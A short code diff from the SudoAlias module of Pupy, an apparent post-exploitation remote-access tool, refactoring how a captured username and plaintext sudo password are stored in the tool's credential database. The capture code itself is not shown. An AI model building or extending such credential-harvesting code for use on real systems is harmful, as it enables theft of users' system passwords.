@@ -30,8 +30,13 @@ class SudoAlias(PupyModule):
                 # add password to the database
                 username = data.split('/')[0]
                 password = data.replace(username, '')[1:]
-                db = Credentials()
-                db.add([{'Login': username, 'password':password, 'CredType': 'plaintext', 'Category': 'System password', 'uid': self.client.short_name()}])
+                db = Credentials(client=self.client.short_name(), config=self.config)
+                db.add([{
+                    'Login': username,
+                    'password':password,
+                    'CredType': 'plaintext',
+                    'Category': 'System password'
+                }])
                 self.success("Credentials stored on the database")
 
         elif args.action=="stop":
